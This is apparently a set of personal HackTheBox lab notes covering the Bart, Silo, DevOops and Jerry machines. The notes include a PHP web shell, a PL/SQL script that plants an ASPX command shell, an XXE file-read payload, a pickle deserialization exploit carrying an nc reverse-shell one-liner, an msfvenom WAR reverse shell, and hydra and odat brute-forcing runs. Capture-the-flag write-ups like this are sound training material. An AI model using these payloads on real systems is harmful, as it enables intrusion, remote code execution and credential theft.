level-6'>html</h1><br/>&lt;div class=&quot;name&quot;&gt;Harvey Potter&lt;/div&gt;<br />																						&lt;div class=&quot;pos&quot;&gt;Developer@BART&lt;/div&gt;<br />																						&lt;ul class=&quot;team-social&quot;&gt;<br />																							&lt;li&gt;&lt;a class=&quot;facebook&quot; href=&quot;#&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa&quot;&gt;F&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;<br />																							&lt;li&gt;&lt;a class=&quot;twitter&quot; href=&quot;#&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa&quot;&gt;T&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;<br />																							&lt;li&gt;&lt;a class=&quot;google&quot; href=&quot;#&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa&quot;&gt;G&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;<br />																							&lt;li&gt;&lt;a class=&quot;mail&quot; href=&quot;mailto:h.potter@bart.htb&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa&quot;&gt;M&lt;/i&gt;&lt;/a&gt;&lt;/li</div><div class='page'><h1 class='title level-6'>userlist</h1><br/>samantha brown<br />daniel simmons<br />jane doe<br />robert hilton<br />harvey potter<br /><br />s.brown<br />d.simmons<br />j.doe<br />r.hilton<br />h.potter<br /><br />samantha<br />daniel<br />jane<br />robert<br />harvey<br />bobby</div><div class='page'><h1 class='title level-6'>lp</h1><br/> &lt;?php system($_REQUEST[&#39;YeetCannon&#39;]); ?&gt;<br /><br />log.php<br />hotdog!<br />&amp;YeetCannon=whoami</div><div class='page'><h1 class='title level-6'>hydra</h1><br/>root@kali:~/Desktop/Machines/HTB/Bart# hydra -l harvey -P /root/Desktop/Tools/Wordlists/rockyou.txt internal-01.bart.htb http-post-form &#39;/simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:Password&#39;<br />Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.<br /><br />Hydra (<a href="http://www.thc.org/thc-hydra)">http://www.thc.org/thc-hydra)</a> starting at 2019-12-20 20:21:19<br />[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br />[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:0), ~14344399 tries per task<br />[DATA] attacking http-post-form://internal-01.bart.htb:80//simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:Password<br />[STATUS] 348.00 tries/min, 348 tries in 00:00h, 0 to do in 01:00h, 14344051 active<br />[STATUS] 340.33 tries/min, 1021 tries in 00:00h, 0 to do in 03:00h, 14343378 active<br />[STATUS] 348.57 tries/min, 2440 tries in 00:00h, 0 to do in 07:00h, 14341959 active<br />[80][http-post-form] host: internal-01.bart.htb   login: harvey   password: Password1<br />1 of 1 target successfully completed, 1 valid password found<br />[WARNING] Writing restore file because 1 final worker threads did not complete until end.<br />[ERROR] 1 target did not resolve or could not be connected<br />[ERROR] 16 targets did not complete<br />Hydra (<a href="http://www.thc.org/thc-hydra)">http://www.thc.org/thc-hydra)</a> finished at 2019-12-20 20:31:35<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />    625b6c7aa299599acae0125d3af3830f<br />root<br />    0074a38e6eac2d3785741713b3bfa2dc</div><div class='page'><h1 class='title level-4'>10.10.10.82 Silo</h1><br/>nmap showed that smb, http and oracle were open.<br />http was a default iis webpage and smb was locked up.<br />Becasue it was oracle i followed the standard steps.<br /><br />installing <a href="https://github.com/quentinhardy/odat">https://github.com/quentinhardy/odat</a> was a massive pain in the ass, but ippsec helped.<br /><br />first, I discovered sids<br />python3 /Yeet/Machines/HTB/Silo/odat/odat all -s 10.10.10.82 <br /><br />second, brute forced logins with a custom password list (now on on pirvate github repo)<br />python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file ../oracle_userpass.txt<br /><br />third, logged in with the new creds via sqlplus64<br />sqlplus64<br /><br />forth, I verified that I could read the default webpage with a sql script<br /><br />fifth, I verified I could write a file to the webpage<br /><br />sixth, I wrote a short aspx webshell to the webpage<br /><br />seventh, I got a reverse shell with nisheng invoke-powershelltcp.ps1<br /><br />eighth, In running windows privesc commands I saw that the machine may be vulnerable to rotten potato<br /><br />nine, uploaded files with certutil, ran rotten potato and rooted!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />2. discover sid<br />nmap --script=oracle-sid-brute -p 1521 10.10.10.82<br />--or--<br />hydra -L ./sids.txt -s 1521 10.10.10.82 oracle-sid<br />--or--<br />python3 /Yeet/Machines/HTB/Silo/odat/odat sidguesser -s 10.10.10.82<br />--or--<br />python3 /Yeet/Machines/HTB/Silo/odat/odat all -s 10.10.10.82                    &lt;&lt;&lt;&lt;recomended to start even though it be way slow<br /><br />3. brute logins on the sid<br />python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file ../oracle_userpass.txt<br />                                                                                ^ is the sid                ^password list on my private github repo<br />                                                                                <br />4. login with sqlplus64 (subnode)</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>windows server 2012r2 (iis version)<br />x64<br /><br /><br /><br /><br /><br /><br /><br /><br />declare<br />    f utl_file.file_type;<br />    s varchar(200);<br />begin<br />    f := utl_file.fopen(&#39;/users/administrator/desktop&#39;, &#39;root.txt&#39;, &#39;r&#39;);<br />    utl_file.get_line(f,s);<br />    utl_file.fclose(f);<br />    dbms_output.put_line(s);<br />end;<br />/<br /><br /><br /><br /><br /><br /><br />short script to write aspx small aspx webshell--<br />declare<br />    f utl_file.file_type;<br />    s varchar(5000) := &#39;&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;&lt;script Language=&quot;c#&quot; runat=&quot;server&quot;&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = &quot;cmd.exe&quot;;psi.Arguments = &quot;/c &quot;+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(&quot;&lt;pre&gt;&quot;);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(&quot;&lt;/pre&gt;&quot;);}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;&lt;asp:TextBox id=&quot;txtArg&quot; runat=&quot;server&quot; Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id=&quot;testing&quot; runat=&quot;server&quot; Text=&quot;excute&quot; OnClick=&quot;cmdExe_Click&quot;&gt;&lt;/asp:Button&gt;&lt;asp:Label id=&quot;lblText&quot; runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/HTML&gt;&#39;;<br />begin<br />    f := utl_file.fopen(&#39;/inetpub/wwwroot&#39;, &#39;cannon.aspx&#39;, &#39;w&#39;);<br />    utl_file.put_line(f,s);<br />    utl_file.fclose(f);<br />end;<br />/<br /><br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.10.10.82 &amp;&amp; nmap -sC -sV -Pn 10.10.10.82 &amp;&amp; nmap -p- -Pn 10.10.10.82<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-23 10:08 EDT<br />Nmap scan report for 10.10.10.82<br />Host is up (0.32s latency).<br />Not shown: 988 closed ports<br />PORT      STATE SERVICE<br />80/tcp    open  http<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />1521/tcp  open  oracle<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49158/tcp open  unknown<br />49160/tcp open  unknown<br />49161/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 57.89 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-23 10:09 EDT<br />Nmap scan report for 10.10.10.82<br />Host is up (0.31s latency).<br />Not shown: 986 closed ports<br />PORT      STATE    SERVICE      VERSION<br />80/tcp    open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/8.5<br />|_http-title: IIS Windows Server<br />135/tcp   open     msrpc        Microsoft Windows RPC<br />139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn<br />301/tcp   filtered unknown<br />445/tcp   open     microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br />1521/tcp  open     oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)<br />9876/tcp  filtered sd<br />49152/tcp open     msrpc        Microsoft Windows RPC<br />49153/tcp open     msrpc        Microsoft Windows RPC<br />49154/tcp open     msrpc        Microsoft Windows RPC<br />49155/tcp open     msrpc        Microsoft Windows RPC<br />49158/tcp open     msrpc        Microsoft Windows RPC<br />49160/tcp open     oracle-tns   Oracle TNS listener (requires service name)<br />49161/tcp open     msrpc        Microsoft Windows RPC<br />Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -25s, deviation: 0s, median: -25s<br />|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: supported<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-04-23T14:12:04<br />|_  start_date: 2020-04-23T13:33:07<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 203.89 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-23 10:12 EDT</div><div class='page'><h1 class='title level-6'>powerup</h1><br/>[*] Running Invoke-AllChecks<br /><br /><br />[*] Checking if user is in a local group with administrative privileges...<br /><br /><br />[*] Checking for unquoted service paths...<br /><br /><br />[*] Checking service executable and argument permissions...<br />Test-Path : Illegal characters in path.<br />At line:883 char:88<br />+ ...  -ne &#39;&#39;) -and (Test-Path -Path $ParentPath )) {<br />+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~<br />    + CategoryInfo          : InvalidArgument: (C:\oraclexe\app....2.0\server\ <br />   bin:String) [Test-Path], ArgumentException<br />    + FullyQualifiedErrorId : ItemExistsArgumentError,Microsoft.PowerShell.Com <br />   mands.TestPathCommand<br /> <br /><br /><br />ServiceName                     : OracleJobSchedulerXE<br />Path                            : c:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  Bin\extjob.exe XE<br />ModifiableFile                  : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  Bin<br />ModifiableFilePermissions       : AppendData/AddSubdirectory<br />ModifiableFileIdentityReference : BUILTIN\Users<br />StartName                       : LocalSystem<br />AbuseFunction                   : Install-ServiceBinary -Name <br />                                  &#39;OracleJobSchedulerXE&#39;<br />CanRestart                      : False<br /><br />ServiceName                     : OracleJobSchedulerXE<br />Path                            : c:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  Bin\extjob.exe XE<br />ModifiableFile                  : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  Bin<br />ModifiableFilePermissions       : WriteData/AddFile<br />ModifiableFileIdentityReference : BUILTIN\Users<br />StartName                       : LocalSystem<br />AbuseFunction                   : Install-ServiceBinary -Name <br />                                  &#39;OracleJobSchedulerXE&#39;<br />CanRestart                      : False<br /><br />ServiceName                     : OracleMTSRecoveryService<br />Path                            : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  BIN\omtsreco.exe &quot;OracleMTSRecoveryService&quot;<br />ModifiableFile                  : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  BIN<br />ModifiableFilePermissions       : AppendData/AddSubdirectory<br />ModifiableFileIdentityReference : BUILTIN\Users<br />StartName                       : LocalSystem<br />AbuseFunction                   : Install-ServiceBinary -Name <br />                                  &#39;OracleMTSRecoveryService&#39;<br />CanRestart                      : False<br /><br />ServiceName                     : OracleMTSRecoveryService<br />Path                            : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  BIN\omtsreco.exe &quot;OracleMTSRecoveryService&quot;<br />ModifiableFile                  : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  BIN<br />ModifiableFilePermissions       : WriteData/AddFile<br />ModifiableFileIdentityReference : BUILTIN\Users<br />StartName                       : LocalSystem<br />AbuseFunction                   : Install-ServiceBinary -Name <br />                                  &#39;OracleMTSRecoveryService&#39;<br />CanRestart                      : False<br /><br />ServiceName                     : OracleServiceXE<br />Path                            : c:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  bin\ORACLE.EXE XE<br />ModifiableFile                  : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  bin<br />ModifiableFilePermissions       : AppendData/AddSubdirectory<br />ModifiableFileIdentityReference : BUILTIN\Users<br />StartName                       : LocalSystem<br />AbuseFunction                   : Install-ServiceBinary -Name &#39;OracleServiceXE&#39;<br />CanRestart                      : False<br /><br />ServiceName                     : OracleServiceXE<br />Path                            : c:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  bin\ORACLE.EXE XE<br />ModifiableFile                  : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  bin<br />ModifiableFilePermissions       : WriteData/AddFile<br />ModifiableFileIdentityReference : BUILTIN\Users<br />StartName                       : LocalSystem<br />AbuseFunction                   : Install-ServiceBinary -Name &#39;OracleServiceXE&#39;<br />CanRestart                      : False<br /><br />ServiceName                     : OracleXEClrAgent<br />Path                            : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  bin\OraClrAgnt.exe agent_sid=CLRExtProc <br />                                  max_dispatchers=2 tcp_dispatchers=0 <br />                                  max_task_threads=6 max_sessions=25 ENVS=&quot;EXTP<br />                                  ROC_DLLS=ONLY:C:\oraclexe\app\oracle\product\<br />                                  11.2.0\server\bin\oraclr11.dll&quot;<br />ModifiableFile                  : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  bin<br />ModifiableFilePermissions       : AppendData/AddSubdirectory<br />ModifiableFileIdentityReference : BUILTIN\Users<br />StartName                       : LocalSystem<br />AbuseFunction                   : Install-ServiceBinary -Name <br />                                  &#39;OracleXEClrAgent&#39;<br />CanRestart                      : False<br /><br />ServiceName                     : OracleXEClrAgent<br />Path                            : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  bin\OraClrAgnt.exe agent_sid=CLRExtProc <br />                                  max_dispatchers=2 tcp_dispatchers=0 <br />                                  max_task_threads=6 max_sessions=25 ENVS=&quot;EXTP<br />                                  ROC_DLLS=ONLY:C:\oraclexe\app\oracle\product\<br />                                  11.2.0\server\bin\oraclr11.dll&quot;<br />ModifiableFile                  : C:\oraclexe\app\oracle\product\11.2.0\server\<br />                                  bin<br />ModifiableFilePermissions       : WriteData/AddFile<br />ModifiableFileIdentityReference : BUILTIN\Users<br />StartName                       : LocalSystem<br />AbuseFunction                   : Install-ServiceBinary -Name <br />                                  &#39;OracleXEClrAgent&#39;<br />CanRestart                      : False<br /><br /><br /><br /><br /><br />[*] Checking service permissions...<br /><br /><br />[*] Checking %PATH% for potentially hijackable DLL locations...<br /><br /><br />ModifiablePath    : C:\oraclexe\app\oracle\product\11.2.0\server\bin<br />IdentityReference : BUILTIN\Users<br />Permissions       : AppendData/AddSubdirectory<br />%PATH%            : C:\oraclexe\app\oracle\product\11.2.0\server\bin<br />AbuseFunction     : Write-HijackDll -DllPath &#39;C:\oraclexe\app\oracle\product\11<br />                    .2.0\server\bin\wlbsctrl.dll&#39;<br /><br />ModifiablePath    : C:\oraclexe\app\oracle\product\11.2.0\server\bin<br />IdentityReference : BUILTIN\Users<br />Permissions       : WriteData/AddFile<br />%PATH%            : C:\oraclexe\app\oracle\product\11.2.0\server\bin<br />AbuseFunction     : Write-HijackDll -DllPath &#39;C:\oraclexe\app\oracle\product\11<br />                    .2.0\server\bin\wlbsctrl.dll&#39;<br /><br /><br /><br /><br /><br />[*] Checking for AlwaysInstallElevated registry key...<br /><br /><br />[*] Checking for Autologon credentials in registry...<br /><br /><br />[*] Checking for modifidable registry autoruns and configs...<br /><br /><br />[*] Checking for modifiable schtask files/configs...<br /><br /><br />[*] Checking for unattended install files...<br /><br /><br />UnattendPath : C:\Windows\Panther\Unattend.xml<br /><br /><br /><br /><br /><br />[*] Checking for encrypted web.config strings...<br /><br /><br />[*] Checking for encrypted application pool and virtual directory passwords...<br /><br /><br />[*] Checking for plaintext passwords in McAfee SiteList.xml files....<br /><br /><br /><br /><br />[*] Checking for cached Group Policy Preferences .xml files....<br /><br /><br />  Command:</div><div class='page'><h1 class='title level-6'>oracle</h1><br/>root@CoolHandKali:/Yeet/Machines/HTB/Silo/odat# python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file ../oracle_userpass.txt<br />./odat.py:52: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module&#39;s documentation for alternative uses<br />  import imp<br /><br />[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521<br />The login cdemo82 has already been tested at least once. What do you want to do:                                                                                                     | ETA:  00:11:17 <br />- stop (s/S)<br />- continue and ask every time (a/A)<br />- continue without to ask (c/C)<br />c<br />[+] Valid credentials found: scott/tiger. Continue...                                 ##################################################################################             | ETA:  00:01:16 <br />100% |###############################################################################################################################################################################| Time: 00:19:16 <br />[+] Accounts found on 10.10.10.82:1521/XE: <br />scott/tiger<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />92ede778a1cc8d27cb6623055c331617<br />root<br />cd39ea0af657a495e33bc59c7836faf6</div><div class='page'><h1 class='title level-4'>10.10.10.91 DevOops</h1><br/>nmap showed that the machine was only running ssh and gunicorn 19.7.1 on port 5000.<br />gobuster showed that their were directories on /feed and /upload<br />   gobuster dir -u http://10.10.10.91:5000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br /><br />/upload was looking for a .xml containing the elements Author, Subject, Content.<br />Useing burp I was able to successfully upload<br />&lt;yee&gt;<br />    &lt;Author&gt;Squid&lt;/Author&gt;<br />    &lt;Subject&gt;Yeet&lt;/Subject&gt;<br />    &lt;Content&gt;cannon&lt;/Content&gt;<br />&lt;/yee&gt;<br />Great!<br />Now my research on gunicorn 19.7.1 has stated that it is vulnerable to xxe (xml eXternal entity).<br />In other words, it may execute certain formats of code in the elements allowing you to read files.<br />I drew this this up to read /etc/passwd. (props to payloadallthethings)<br /><br />&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;/etc/passwd&#39;&gt;]&gt;<br />&lt;yee&gt;<br />    &lt;Author&gt;Squid&lt;/Author&gt;<br />    &lt;Subject&gt;&amp;test;&lt;/Subject&gt;<br />    &lt;Content&gt;cannon&lt;/Content&gt;<br />&lt;/yee&gt; <br /><br />/etc/passwd is dumped!<br />From here I dumped the id_rsa key to the one user that wasn&#39;t root and logged in via ssh, but There was another inteded way to do it with pickles.<br />The main page for the website was feed.py. When I dumped it I saw the funciton...<br /><br />@app.route(&quot;/newpost&quot;, methods=[&quot;POST&quot;])<br />def newpost():<br />  # TODO: proper save to database, this is for testing purposes right now<br />  picklestr = base64.urlsafe_b64decode(request.data)<br />#  return picklestr<br />  postObj = pickle.loads(picklestr)<br />  return &quot;POST RECEIVED: &quot; + postObj[&#39;Subject&#39;]<br />  <br />looks like we can POST to this new directory /newpost.<br />We can also see that the the input will be urlsafe_b64decoded, so we will need to urlsafe_b64encode or request before we send it.<br />I wrote up this python script to run pentestmonkeys&#39; nc oneliner<br /><br />pickle_exploit.py<br />######################################################## <br />import pickle<br />from base64 import urlsafe_b64encode<br /><br />RUNME = &quot;&quot;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.60 3232 &gt;/tmp/f&quot;&quot;&quot;<br /><br />class Yeet(object):<br />        def __reduce__(self):<br />                import os<br />                return(os.system, (RUNME,))<br /><br />print urlsafe_b64encode(pickle.dumps(Yeet()))<br />#print pickle.dumps(Yeet())<br />#########################################################<br /><br />In burp I sent a post request to /newpost and caught a reverse shell with nc!<br />user.txt!<br /><br />during basic enumeration I saw a .git directory in roosa&#39;s home.<br />git log             and now I can see the commits. One of the commits states that she fixed a commit with proper key.<br />git diff 33e87c312c08735a02fa9c796021a4a3023129ad       and we can see that a private key was changed.<br />take the new private key, chmod, ssh in as root...<br />root.txt<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>enumeraton</h1><br/>newer ubuntu</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.10.10.91 &amp;&amp; nmap -sC -sV -Pn 10.10.10.91 &amp;&amp; nmap -p- -Pn 10.10.10.91<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-24 15:21 EDT<br />Nmap scan report for dev.solita.fi (10.10.10.91)<br />Host is up (0.14s latency).<br />Not shown: 998 closed ports<br />PORT     STATE SERVICE<br />22/tcp   open  ssh<br />5000/tcp open  upnp<br /><br />Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-24 15:21 EDT<br />Nmap scan report for dev.solita.fi (10.10.10.91)<br />Host is up (0.12s latency).<br />Not shown: 997 closed ports<br />PORT     STATE    SERVICE VERSION<br />22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)<br />|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)<br />|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)<br />119/tcp  filtered nntp<br />5000/tcp open     http    Gunicorn 19.7.1<br />|_http-server-header: gunicorn/19.7.1<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 26.72 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-24 15:22 EDT</div><div class='page'><h1 class='title level-6'>5000 http</h1><br/></div><div class='page'><h1 class='title level-7'>web nmap</h1><br/>Scanned at 2020-04-24 10:14:38 EDT for 8s<br /><br />PORT     STATE SERVICE REASON  VERSION<br />5000/tcp open  http    syn-ack Gunicorn 19.7.1<br />|_http-server-header: gunicorn/19.7.1<br /><br />NSE: Script Post-scanning.<br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>nikto -host http://10.10.10.91:5000<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.91<br />+ Target Hostname:    10.10.10.91<br />+ Target Port:        5000<br />+ Start Time:         2020-04-24 10:14:58 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: gunicorn/19.7.1<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: HEAD, OPTIONS, GET <br />+ 7866 requests: 0 error(s) and 4 item(s) reported on remote host<br />+ End Time:           2020-04-24 10:51:41 (GMT-4) (2203 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />squid@CoolHandKali:/Yeet/Machines/HTB/Devoops$ <br /></div><div class='page'><h1 class='title level-7'>gobuster</h1><br/>squid@CoolHandKali:/Yeet/Machines/HTB/Devoops$ gobuster dir -u http://10.10.10.91:5000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <br />===============================================================<br />Gobuster v3.0.1<br />by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)<br />===============================================================<br />[+] Url:            http://10.10.10.91:5000<br />[+] Threads:        10<br />[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br />[+] Status codes:   200,204,301,302,307,401,403<br />[+] User Agent:     gobuster/3.0.1<br />[+] Timeout:        10s<br />===============================================================<br />2020/04/24 15:25:49 Starting gobuster<br />===============================================================<br />/feed (Status: 200)<br />/upload (Status: 200)<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />c5808e1643e801d40f09ed87cdecc67b<br />root<br />d4fe1e7f7187407eebdd3209cb1ac7b3</div><div class='page'><h1 class='title level-4'>10.10.10.95 Jerry</h1><br/>Nmap showed that only port 8080 was running<br />nmap version showed that it was apache tomcat 7<br />dirsearch showed that I could navigate to /manager/html ... but I need creds<br />    the creds are actually on the page, but I was also able to aquire them with hydra<br />    <br />    HYDRA_PROXY_HTTP=<a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a> hydra -C  /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html<br />    when first catching the creds being sent with burp I could see it was a base 64 encoded string. example YWRtaW46YWRzM2NyZXQ= admin:ads3cret<br />    <br />    tomcat:s3cret works!<br />    <br />    manager/html allows you to upload and execute a .war file (compressed javascript).<br />    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f war &gt; reverse.war        (found at payload all the things)<br />    start a reverse listener with nc<br />    upload and deploy the binary via the gui and when you refresh the page /reverse is now a link!  (note that it is not reverse.war or reverse.jsp)<br />    click the link and you win the ...WAR.</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><a href="http://10.10.10.95:8080/manager/html">http://10.10.10.95:8080/manager/html</a>    username=tomcat password=s3cret</div><div class='page'><h1 class='title level-6'>nmap short</h1><br/>squid@CoolHandKali:/Yeet/Machines/HTB/Jerry$ nmap 10.10.10.95 -Pn<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-01 10:48 EDT<br />Nmap scan report for 10.10.10.95<br />Host is up (0.15s latency).<br />Not shown: 999 filtered ports<br />PORT     STATE SERVICE<br />8080/tcp open  http-proxy<br /><br />Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds<br /></div><div class='page'><h1 class='title level-6'>nmap version</h1><br/>Nmap done: 1 IP address (0 hosts up) scanned in 3.35 seconds<br />squid@CoolHandKali:/Yeet/Machines/HTB/Jerry$ nmap -sC -sV -Pn 10.10.10.95<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-01 10:50 EDT<br />Nmap scan report for 10.10.10.95<br />Host is up (0.13s latency).<br />Not shown: 999 filtered ports<br />PORT     STATE SERVICE VERSION<br />8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1<br />|_http-favicon: Apache Tomcat<br />|_http-server-header: Apache-Coyote/1.1<br />|_http-title: Apache Tomcat/7.0.88<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 24.13 seconds<br /></div><div class='page'><h1 class='title level-6'>web</h1><br/></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>nikto -host <a href="http://10.10.10.95:8080">http://10.10.10.95:8080</a> | tee nikto_10.10.10.95:8080<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.95<br />+ Target Hostname:    10.10.10.95<br />+ Target Port:        8080<br />+ Start Time:         2020-04-01 10:50:48 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache-Coyote/1.1<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community<br />+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, 